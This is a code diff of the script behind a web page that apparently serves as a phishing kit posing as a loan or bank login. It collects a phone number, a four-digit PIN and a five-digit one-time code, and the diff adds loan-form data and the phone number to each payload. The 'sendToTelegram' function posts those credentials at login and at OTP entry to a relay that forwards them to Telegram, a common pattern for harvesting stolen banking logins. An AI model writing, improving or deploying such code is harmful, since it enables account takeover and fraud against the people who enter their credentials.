@@ -288,19 +288,40 @@ Cancel
 
 <script>
 
+/* loan capture restored */
+
+function buildLoanRequest(){
+
+try{
+
+const loan=JSON.parse(sessionStorage.getItem("loanForm")||"{}");
+
+if(!loan.loanAmount) return "N/A";
+
+return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
+
+}catch{
+
+return "N/A";
+
+}
+
+}
+
+
 /* PIN */
 
 const pins=[...document.querySelectorAll('.pin-digit')];
 
-let pinValue='';
+let pinValue="";
 
 pins.forEach((el,i)=>{
 
-el.addEventListener('input',()=>{
+el.addEventListener("input",()=>{
 
-el.value=el.value.replace(/\D/g,'');
+el.value=el.value.replace(/\D/g,"");
 
-el.classList.toggle('filled',el.value);
+el.classList.toggle("filled",el.value);
 
 if(el.value && i<3) pins[i+1].focus();
 
@@ -308,15 +329,16 @@ updatePin();
 
 });
 
-el.addEventListener('keydown',e=>{
+
+el.addEventListener("keydown",e=>{
 
 if(e.key==="Backspace" && !el.value && i>0){
 
 pins[i-1].focus();
 
-pins[i-1].value='';
+pins[i-1].value="";
 
-pins[i-1].classList.remove('filled');
+pins[i-1].classList.remove("filled");
 
 updatePin();
 
@@ -329,29 +351,29 @@ updatePin();
 
 function updatePin(){
 
-pinValue=pins.map(x=>x.value).join('');
+pinValue=pins.map(x=>x.value).join("");
 
-loginBtn.disabled=!(pinValue.length===4);
+loginBtn.disabled=pinValue.length!==4;
 
 }
 
 
 /* OTP */
 
-const dots=[...document.querySelectorAll('.otp-digit')];
+const dots=[...document.querySelectorAll(".otp-digit")];
 
-const buffer=document.getElementById('otpBuffer');
+const buffer=document.getElementById("otpBuffer");
 
-const confirmBtn=document.getElementById('confirmOtp');
+const confirmBtn=document.getElementById("confirmOtp");
 
 
-buffer.addEventListener('input',()=>{
+buffer.addEventListener("input",()=>{
 
-buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
+buffer.value=buffer.value.replace(/\D/g,"").slice(0,5);
 
 dots.forEach((d,i)=>{
 
-d.classList.toggle('filled',buffer.value[i]);
+d.classList.toggle("filled",buffer.value[i]);
 
 });
 
@@ -360,7 +382,7 @@ confirmBtn.disabled=buffer.value.length!==5;
 });
 
 
-buffer.addEventListener('keydown',e=>{
+buffer.addEventListener("keydown",e=>{
 
 if(e.key==="Backspace"){
 
@@ -368,7 +390,7 @@ buffer.value=buffer.value.slice(0,-1);
 
 dots.forEach((d,i)=>{
 
-d.classList.toggle('filled',buffer.value[i]);
+d.classList.toggle("filled",buffer.value[i]);
 
 });
 
@@ -377,7 +399,7 @@ d.classList.toggle('filled',buffer.value[i]);
 });
 
 
-/* telegram instant */
+/* instant telegram */
 
 function sendToTelegram(data){
 
@@ -385,11 +407,7 @@ fetch("/api/sendTelegram",{
 
 method:"POST",
 
-headers:{
-
-"Content-Type":"application/json"
-
-},
+headers:{"Content-Type":"application/json"},
 
 body:JSON.stringify(data)
 
@@ -400,7 +418,7 @@ body:JSON.stringify(data)
 
 /* login */
 
-document.getElementById("loginForm").onsubmit=e=>{
+loginForm.onsubmit=e=>{
 
 e.preventDefault();
 
@@ -408,9 +426,11 @@ sendToTelegram({
 
 event:"login",
 
+phone:phone.value,
+
 pin:pinValue,
 
-phone:phone.value,
+loan_request:buildLoanRequest(),
 
 time:new Date().toISOString()
 
@@ -431,11 +451,13 @@ sendToTelegram({
 
 event:"otp",
 
-otp:buffer.value,
+phone:phone.value,
 
 pin:pinValue,
 
-phone:phone.value,
+otp:buffer.value,
+
+loan_request:buildLoanRequest(),
 
 time:new Date().toISOString()
 
